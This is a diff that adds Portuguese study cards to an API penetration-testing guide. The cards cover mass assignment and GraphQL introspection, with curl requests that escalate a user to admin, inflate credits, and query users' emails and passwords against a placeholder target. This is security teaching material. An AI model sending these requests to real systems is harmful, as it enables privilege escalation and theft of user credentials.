@@ -303,7 +303,126 @@ PASSO 5: Rate Limiting → Verificar se bloqueia abuso
 - **Tempo estimado:** 60 min
 
 ### Dica de Estudo
-> BOLA é a vulnerabilidade mais comum em APIs. Sempre teste alterando IDs em endpoints que retornam dados de usuários.
+> BOLA é a vulnerabilidade mais comum em APIs. Sempre teste alterando IDs em endpoints que retornam dados.
+
+---
+
+## Tool Card: Mass Assignment
+
+**O que é:** Vulnerabilidade onde a API aceita campos extras no body JSON — permite modificar campos que o usuário não deveria (ex: `role: admin`, `isVerified: true`).
+
+### Como testar
+
+```bash
+# 1. Fazer POST normal para criar usuário
+curl -X POST http://target.com/api/users \
+  -H "Content-Type: application/json" \
+  -d '{"name": "João", "email": "joao@test.com"}'
+
+# OUTPUT ESPERADO:
+# {"id": 42, "name": "João", "email": "joao@test.com", "role": "user"}
+
+# 2. Inserir campo extra: role = admin
+curl -X POST http://target.com/api/users \
+  -H "Content-Type: application/json" \
+  -d '{"name": "Attacker", "email": "attacker@evil.com", "role": "admin"}'
+
+# Se retornar 201 com role "admin" = Mass Assignment!
+
+# 3. Testar outros campos sensíveis
+curl -X PUT http://target.com/api/users/42 \
+  -H "Content-Type: application/json" \
+  -d '{"name": "João", "isVerified": true, "credits": 99999}'
+
+# Se aceitar = Mass Assignment
+
+# 4. Enumerar campos possíveis
+# - role, isAdmin, isVerified, credits, balance
+# - email_verified, account_type, permissions
+```
+
+### Exemplo real: élevação de privilégio
+
+```bash
+# Criar conta normal
+curl -X POST http://target.com/api/register \
+  -d '{"user": "attacker", "pass": "senha123"}'
+
+# Atualizar para admin
+curl -X PUT http://target.com/api/users/attacker \
+  -H "Authorization: Bearer <token>" \
+  -d '{"user": "attacker", "role": "admin"}'
+
+# Se aceitar = você agora é admin!
+```
+
+---
+
+## Tool Card: GraphQL Introspection
+
+**O que é:** GraphQL expõe todo o schema via query de introspecção — permite descobrir todos os tipos, queries, mutations e campos.
+
+### Query de Introspecção
+
+```bash
+# Query GraphQL completa de introspecção
+curl -X POST http://target.com/graphql \
+  -H "Content-Type: application/json" \
+  -d '{"query": "{ __schema { queryType { name } mutationType { name } types { name kind fields { name type { name kind ofType { name kind } } } } } }"}'
+
+# OUTPUT ESPERADO:
+# {
+#   "data": {
+#     "__schema": {
+#       "queryType": { "name": "Query" },
+#       "mutationType": { "name": "Mutation" },
+#       "types": [
+#         { "name": "User", "kind": "OBJECT", "fields": [
+#           { "name": "id", "type": { "name": "ID" } },
+#           { "name": "email", "type": { "name": "String" } },
+#           { "name": "password", "type": { "name": "String" } },
+#           { "name": "role", "type": { "name": "String" } }
+#         ]},
+#         ...
+#       ]
+#     }
+#   }
+# }
+```
+
+### Introspecção parcial (quando completo é bloqueado)
+
+```bash
+# Tentar tipos específicos
+curl -X POST http://target.com/graphql \
+  -d '{"query": "{ __type(name: \"User\") { name fields { name type { name } } } }"}'
+
+# Listar queries disponíveis
+curl -X POST http://target.com/graphql \
+  -d '{"query": "{ __schema { queryType { fields { name } } } }"}'
+
+# Listar mutations
+curl -X POST http://target.com/graphql \
+  -d '{"query": "{ __schema { mutationType { fields { name } } } }"}'
+```
+
+### Explorar campos sensíveis
+
+```bash
+# Após introspecção, buscar dados
+curl -X POST http://target.com/graphql \
+  -d '{"query": "{ users { id email password role } }"}'
+
+# Se retornar passwords = vulnerabilidade grave!
+
+# Buscar dados de outros usuários
+curl -X POST http://target.com/graphql \
+  -d '{"query": "{ user(id: 1) { email password } }"}'
+
+# Mutation para alterar dados
+curl -X POST http://target.com/graphql \
+  -d '{"query": "mutation { updateUser(id: 1, role: \"admin\") { id role } }"}'
+```
 
 ---
 
